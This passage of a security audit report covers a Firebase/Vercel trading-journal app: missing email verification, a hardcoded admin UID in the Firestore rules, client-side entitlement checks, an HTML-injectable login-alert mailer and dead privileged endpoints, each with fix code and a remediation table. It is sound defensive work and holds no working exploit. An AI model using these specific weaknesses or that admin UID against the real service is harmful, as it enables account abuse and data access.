  if (!SYMBOL.test(symbol))          throw new Error('invalid symbol')
  if (!['open', 'close'].includes(body.event)) throw new Error('invalid event')
  return {
    event: body.event, positionId, symbol,
    direction: ['BUY', 'SELL'].includes(String(body.direction).toUpperCase())
      ? String(body.direction).toUpperCase() : 'BUY',
    lots:       Math.min(Math.max(Number(body.lots) || 0, 0), 1000),
    price:      Number(body.price) || 0,
    profit:     Math.min(Math.max(Number(body.profit) || 0, -1e7), 1e7),
    commission: Number(body.commission) || 0,
    swap:       Number(body.swap) || 0,
    comment:    String(body.comment ?? '').slice(0, 500),
    time:       body.time,
  }
}
```

Apply to both `/sync-trade` and `/tv-webhook`, which currently duplicate ~30 lines of near-identical handling — collapse them into one validated helper. Then make `/api/reset-trades` recursive (`firestore.recursiveDelete(tradesColRef)`) so erasure is genuinely complete.

---

## M-05 — Email verification is never required or requested

**Severity:** Medium · **CWE-287**
**Location:** [`src/Login.jsx:163-203`](src/Login.jsx#L163)

`sendEmailVerification` and `emailVerified` appear nowhere in the codebase. `createUserWithEmailAndPassword` is followed immediately by a signed-in session with full application access.

**Consequences.** Anyone can register with an address they do not control, so email is not a trustworthy identifier for support or account recovery. Unverified addresses inflate your Resend bounce rate — `/api/cron/remind-expiry` mails every Pro user, and hard bounces to fabricated addresses damage domain reputation for your genuine transactional mail. It is also the enabler for the free-account abuse in `H-02` and `H-06`.

### Fix

```js
// After createUserWithEmailAndPassword in Login.jsx
await sendEmailVerification(user, { url: `${window.location.origin}/app` });
setMessage('Check your inbox to verify your email address.');
```

Enforce it server-side on privileged paths — the client check alone is not a control:

```ts
export async function getUidFromContext(c: Context, opts?: { requireVerified?: boolean }): Promise<string> {
  const authHeader = c.req.header('Authorization') || ''
  if (!authHeader.startsWith('Bearer ')) throw new Error('Missing or malformed Authorization header')
  const decoded = await admin.auth().verifyIdToken(authHeader.substring(7))
  if (!decoded.uid) throw new Error('UID missing from token claims')
  if (opts?.requireVerified && !decoded.email_verified) throw new Error('Email not verified')
  return decoded.uid
}
```

Require verification for `/connect-broker`, `/broker-login-sync`, and `/generate-api-key`. Mirror it in Firestore rules for writes that cost money:

```
allow create: if request.auth != null
  && request.auth.uid == userId
  && request.auth.token.email_verified == true;
```

---

## M-06 — Hardcoded superuser UID in Firestore rules

**Severity:** Medium · **CWE-798** (Hardcoded Credentials)
**Location:** [`firestore.rules:5-11`](firestore.rules#L5)

```
function isAdmin() {
  return signedIn() && (
    request.auth.token.admin == true ||
    request.auth.token.role == 'admin' ||
    request.auth.uid == 'rbGsMM2A2EdhgKLKLf9y0dGJ7RY2'
  );
}
```

A UID is an identifier, not a secret, so publishing it is not itself a leak. The risk is structural: this account can read **every user's documents** (`firestore.rules:13`), read and write `payments`, `coupons`, and `settings`, and write `announcements` — and nothing in the repo requires MFA on it, rotates it, or logs its use. It is also unconditional: it cannot be revoked without a rules deploy, so there is no fast off-switch during an incident.

Compounding: `setCustomUserClaims` appears nowhere in the codebase, so the `admin`/`role` claim branches are unreachable — the hardcoded UID is the *only* live admin path.

### Fix

1. Enforce **MFA on that Google account today** — it is the single highest-value credential in the system.
2. Replace the hardcoded branch with custom claims, so admin access is grantable and revocable without a rules deploy:
   ```
   function isAdmin() { return signedIn() && request.auth.token.admin == true; }
   ```
3. Set the claim from a privileged, audited path (Admin SDK script or a protected function), never from client-reachable code.
4. Add `allow read: if false` on `users` for admins and instead expose the specific admin views you actually need through server routes, so bulk reads of customer data are logged rather than implicit.

---

## M-07 — Entitlements and abuse controls enforced in the client

**Severity:** Medium · **CWE-602** (Client-Side Enforcement of Server-Side Security)
**Location:** [`src/services/featureGate.js`](src/services/featureGate.js), [`src/data/repositories/FirebaseTradeRepository.js:58-100`](src/data/repositories/FirebaseTradeRepository.js#L58), [`firestore.rules:17-21`](firestore.rules#L17)

`requireProFeature()` shows an upsell modal and returns `false` — pure UI. Real enforcement exists only on the broker routes (`isSyncAllowed`). Any Pro feature that runs entirely client-side against Firestore is unlocked by editing one variable in devtools.

Separately, the Firestore rule protects exactly seven billing fields:

```
!request.resource.data.diff(resource.data).affectedKeys()
   .hasAny(['plan','planExpiry','isTrial','lemonSqueezySubscriptionId','lemonSqueezyStatus','graceUntil','graceReason'])
```

The paywall itself is correctly protected. But `totalTradesLogged`, the whole `analytics.*` map, `mt5SyncEnabled`, `agreedToTerms`, `proLegalAccepted`, and `walletBalance` are all directly client-writable — and `FirebaseTradeRepository` has the client compute and apply its own analytics deltas. So every aggregate the product reports is attacker-controlled.

`FREE_TRADE_LIMIT` is `Number.POSITIVE_INFINITY` (`src/config/tradeConfig.js:2`), so unlimited manual trades is the intended product design and the 50-trade cap in `/api/save-trade` (`:801-809`) is stale dead code. Worth deleting so it does not read as a live control.

### Fix

Use an **allowlist** rather than a denylist, so new server-owned fields are protected by default:

```
function clientWritableUserFields() {
  return ['firstName','lastName','displayName','email','country','photoURL',
          'agreedToTerms','agreedAt','proLegalAccepted','proLegalAcceptedAt',
          'proLegalVersion','refundPolicyAcknowledged','walletBalance',
          'monthlyGoal','lastTradeTime','createdAt','updatedAt'];
}

match /users/{userId} {
  allow update: if request.auth != null && request.auth.uid == userId
    && request.resource.data.diff(resource.data).affectedKeys()
         .hasOnly(clientWritableUserFields());
}
```

Move `totalTradesLogged` and `analytics.*` to server-computed values — either a Firestore trigger on `users/{uid}/trades/{id}` writes, or route trade mutations through the existing `/api/save-trade`. Then gate genuinely Pro-only capabilities behind a server route that re-checks `isSyncAllowed()`, treating `featureGate.js` purely as UX.

---

## M-08 — Login-alert endpoint is an authenticated mail amplifier with HTML injection

**Severity:** Medium · **CWE-770 / CWE-80**
**Location:** [`api/[[...route]].ts:77-132`](api/[[...route]].ts#L77)

```ts
const userAgent = body.userAgent || c.req.header('user-agent') || 'Unknown'
const time = body.time || new Date().toUTCString()
// … interpolated raw into the email body:
<td …>${ipAddress}</td>  <td …>${userAgent || 'Unknown'}</td>  <td …>${time || …}</td>
```

`userAgent` and `time` come straight from the request body, and `ipAddress` from the spoofable header path in `H-03` — all injected unescaped into HTML. The mail is addressed to the token holder's own address, so this is self-directed and not a phishing vector against others. The abuse angle is volume: the endpoint sends an email on **every call**, is bounded only by the bypassable IP limiter, and the send failure is swallowed (line 128-130) so the caller cannot even tell it is being throttled downstream.

### Fix

Escape all three values with the `escapeHtml` helper from `H-04`, cap `userAgent` at 256 characters, ignore `body.time` in favour of a server timestamp, and add a per-UID cooldown so one account cannot trigger more than a handful of alerts per hour:

```ts
const alertKey = `alert:login:${uid}`
if (await kv.get(alertKey)) return c.json({ success: true, skipped: 'cooldown' })
await kv.set(alertKey, 1, { ex: 900 })
```

---

## M-09 — Dead but live privileged endpoints

**Severity:** Medium · **CWE-1059** (Unmaintained Attack Surface)

Four server capabilities have no client call site yet remain deployed and reachable:

| Endpoint | Status |
|---|---|
| `/api/generate-api-key` | No caller in `src/`; mints live API keys (`M-02`) |
| `/api/revoke-api-key` | No caller in `src/` |
| `/api/save-trade` | No caller in `src/`; the client writes Firestore directly |
| `functions/*` callables | No `httpsCallable` in `src/`; unpaywalled broker path (`H-02`) |

Unused code is code nobody reviews, tests, or thinks about during a design change — which is precisely how `H-02` came to exist. Each of these should be either wired into the product with its controls verified, or deleted from the deployment.

---

# LOW / INFORMATIONAL

**L-01 — `localhost:5173` in the production CORS allowlist.** `api/_middleware.ts:11`. Impact is limited because auth is a Bearer token rather than cookies and `Access-Control-Allow-Credentials` is not set, so an attacker page cannot obtain the token. Still, gate it: `if (process.env.NODE_ENV !== 'production') allowedOrigins.push('http://localhost:5173')`.

**L-02 — User IP disclosed to a third party on every login.** `src/Login.jsx:18-25` calls `https://ipapi.co/json/` from the browser. This is a processor relationship that the privacy policy does not disclose. Note the CSP `connect-src` does not include `ipapi.co`, so the request is **blocked in production** and `country` is always `null` — the privacy cost is real in any environment with a looser policy while the feature never works. Either drop it, or derive country server-side from the request geo headers Vercel already provides (`x-vercel-ip-country`), which leaks nothing and actually works.

**L-03 — `reports` collection accepts unvalidated documents.** `firestore.rules:106`: `allow create: if signedIn() && request.resource.data.userId == request.auth.uid` with no schema, size, or rate constraint. Any authenticated user can write arbitrary ~1 MiB documents. Add a `hasOnly()` allowlist and a `size()` cap, matching the good pattern already used for `trades`.

**L-04 — Unbounded collection scans in cron.** `api/[[...route]].ts:1064` reads every `plan == 'pro'` user with no `limit()` or pagination, and `:1123` does the same for grace-period users. At scale this is a slow, costly, timeout-prone job. Paginate with `.limit(500)` and a cursor.

**L-05 — Log injection via `/api/vitals`.** `api/[[...route]].ts:1214-1224` accepts an unauthenticated `body.name` of unbounded length and writes it into structured logs. `route` is capped at 120 chars; `name` and `rating` are not. Cap both and reject `name` values outside a known metric allowlist (`CLS`, `LCP`, `INP`, `FCP`, `TTFB`).

**L-06 — Realtime Database configured with no rules under version control.** `api/_firebase.js:47` sets a `databaseURL` for `asia-southeast1`, but there is no `database.rules.json` in the repo and no `database` block in `firebase.json`. If RTDB was ever enabled on this project, its rules are unmanaged and may still be in test mode (world-readable). Verify in the console; if RTDB is unused, remove the `databaseURL` and disable the instance.

**L-07 — Missing cross-origin isolation headers.** `vercel.json` sets COOP but not `Cross-Origin-Resource-Policy` or `Cross-Origin-Embedder-Policy`. Add `Cross-Origin-Resource-Policy: same-origin` as a low-cost hardening step.

**L-08 — Secrets hygiene is good; keep it that way.** `.env.local` is correctly gitignored, no secret-shaped strings appear in any tracked file, and a scan of all 427 commits found no `.env`, service-account, or key files ever committed. `dist/` is untracked. `docs/SECRETS.md` documents rotation properly. One note: `.env.local` holds a full `FIREBASE_SERVICE_ACCOUNT` private key and a `RESEND_API_KEY` in plaintext on the development workstation — ensure that machine has full-disk encryption, and prefer `vercel env pull` on demand over a long-lived local copy.

---

# Production-grade recommendations

### Remediation status

| Finding | Status | Where |
|---|---|---|
| C-01 broker credentials | **Fixed** — session-scoped store, sign-out purge, legacy strip, privacy policy corrected | `src/lib/brokerCredentials.js`, `src/firebase.js`, `src/hooks/useBrokerAccounts.js` |
| H-01 cron auth bypass | **Fixed** — `assertCron()` on all three handlers, refuses secrets <32 chars | `api/_security.ts`, `api/[[...route]].ts` |
| H-02 unpaywalled callables | **Fixed** — codebase deleted | `functions/` removed, `firebase.json` |
| H-03 IP spoofing | **Fixed** — `x-vercel-forwarded-for`, rightmost XFF, no loopback default | `api/_ipUtils.ts` |
| H-04 contact endpoint | **Fixed** — field caps, email validation, HTML escaping, `text:` part, 5/hour scope | `api/[[...route]].ts`, `api/_middleware.ts` |
| H-05 reCAPTCHA proxy | **Fixed** — endpoint removed, replaced by a fail-closed server helper with action pinning | `api/_security.ts` |
| H-06 no bot protection | **Partial** — email verification + 12-char policy shipped; App Check is console config | `src/Login.jsx`, `docs/SECRETS.md` |
| H-07 dependencies | **Fixed** — 0 vulnerabilities; react-router 7.18.2, hono 4.13.2 | `package.json` |
| M-01 CSP | **Fixed** — `unsafe-eval` removed, wildcards narrowed, `object-src`/`base-uri`/`form-action` added, strict policy in Report-Only | `vercel.json` |
| M-02 API key storage | **Fixed** — SHA-256 document ids, prefix for display, hash-keyed cache | `api/[[...route]].ts`, `api/_tradeService.ts` |
| M-03 webhook | **Fixed** — constant-time compare, event-id dedupe, UID validation | `api/[[...route]].ts` |
| M-04 path injection | **Fixed** — type-strict validator, one shared handler, recursive delete | `api/_security.ts` |
| M-05 email verification | **Fixed** — sent on signup; server enforcement behind `REQUIRE_EMAIL_VERIFICATION` | `src/Login.jsx`, `api/_auth.ts` |
| M-06 hardcoded admin | **Fixed** — custom claim only; grant command documented | `firestore.rules`, `docs/SECRETS.md` |
| M-07 client entitlements | **Fixed** — allowlist rules; counter migration noted inline | `firestore.rules` |
| M-08 mail amplifier | **Fixed** — escaping, server timestamp, 15-min per-UID cooldown | `api/[[...route]].ts` |
| M-09 dead endpoints | **Fixed** — `/save-trade` and `functions/` removed; key routes retained (webhooks depend on them) | — |
| L-01…L-08 | **Fixed** — CORS gating, ipapi removed, `reports` schema, cron pagination, vitals allowlist, RTDB URL removed, CORP added | various |

### Controls worth adding beyond individual fixes

**1. Fail closed on missing configuration.** `H-01`, `H-05`, and the `_firebase.js` init path all degrade quietly when an environment variable is absent — one of them degrades into an auth bypass. Add a startup assertion that hard-fails the deployment in Production if any required secret is missing.

**2. One implementation per privileged capability.** The broker path exists twice with the paywall on only one copy (`H-02`), and `/sync-trade` and `/tv-webhook` duplicate ~30 lines of validation that both get wrong the same way (`M-04`). Consolidate; a control that has to be remembered twice will eventually be applied once.

**3. Validate at the boundary, uniformly.** Every route currently improvises its own field checks. Adopt a schema validator (Zod, Valibot) and make schema validation the first line of every handler. This closes `H-04`, `M-04`, and `M-08` as a class rather than one at a time.

**4. Escape by construction in email.** Three separate injection points (`H-04`, `M-08`) share one root cause: template literals building HTML. Move transactional mail to a template layer that escapes by default (React Email, or Resend's `text:` field where formatting is not needed).

**5. Enforce entitlements server-side.** `M-07`. Any check that decides whether a user gets something they paid for must run somewhere the user cannot edit.

**6. Add security regression tests.** The repo already has a healthy Vitest suite including `_lemon-squeezy.test.js` and `_sync-trade.test.js`. Extend it with cases that assert the negative: cron rejects `Bearer undefined`, `/contact` escapes `<script>`, `positionId` with a slash is rejected, a free-plan token gets 403 from every broker route.

**7. Turn on the platform controls you already pay for.** Firebase App Check (`H-06`), Identity Platform MFA (`M-06`), Firestore TTL policies (`M-03`), and Cloud Audit Logs on the `users` collection. These need configuration, not code.

**8. Add CI security gates.** `npm audit --audit-level=high` and secret scanning (Gitleaks or GitHub secret scanning) on every PR, plus Dependabot. `H-07` accumulated six advisories with nothing watching.

### What is already done well

Worth preserving through the refactors above: server-side ID token verification on every user-scoped route; UID always derived from the verified token and never from the request body (no IDOR anywhere in the API surface); the `handleRouteError` sanitiser that keeps provider errors and credentials out of client responses and logs; correct `timingSafeEqual` usage in `broker-sync-poller`; genuinely strong Firestore schema validation on `trades` including the P&L consistency check; `withAccountLock` and `withRetryBudget` circuit breaking; deliberate credential scrubbing of legacy fields; the IndexedDB cache teardown reasoning in `signOutAndClearCache`; and clean secrets hygiene across the entire git history.

---

*Prepared from static analysis of the `staging` branch at commit `cfb7a9c`. Items marked **[verify]** depend on runtime or platform behaviour and need the one-line check given in the finding.*

---

## Appendix — what remediation changed

**New files**

| File | Purpose |
|---|---|
| `api/_security.ts` | Shared server primitives: `assertCron`, `escapeHtml`, `verifyRecaptcha`, `validateSyncPayload`, `hashToken`, `timingSafeHexEqual`, `assertRequiredConfig` |
| `api/_security.test.js` | 32 regression cases, each asserting a specific attack is refused |
| `src/lib/brokerCredentials.js` | Credential store, split by sensitivity |
| `src/lib/brokerCredentials.test.js` | 11 cases covering the legacy strip and the sign-out purge |
| `.github/workflows/security.yml` | `npm audit --audit-level=high`, regression tests, Gitleaks; weekly schedule |

**Deleted:** `functions/` (three unpaywalled callables), `/api/save-trade` (unused, stale 50-trade cap contradicting `FREE_TRADE_LIMIT = Infinity`), the `action: 'recaptcha'` branch of `/api/auth-utils`.

**A note on the regression tests.** Writing them found a defect the static review had missed: `validateSyncPayload` used `String(value)` on `positionId`, so an object with a crafted `toString()` chose what the validator inspected. It could not inject a path separator — the regex still rejected the result — but the indirection was unnecessary, and the validator is now type-strict. A second case, `preserves every field the trade service consumes`, guards a real regression introduced during remediation: the first version of the validator dropped `openPrice`, which `handleCloseTradeSync` reads to derive pips on a close with no prior open record. Tests that assert the negative earn their keep.

**Verification:** `npm run lint` clean · `npm test` 162 passing across 23 files · `npm run build` succeeds · `npm audit --omit=dev` reports 0 vulnerabilities · app boots and renders with no console errors.
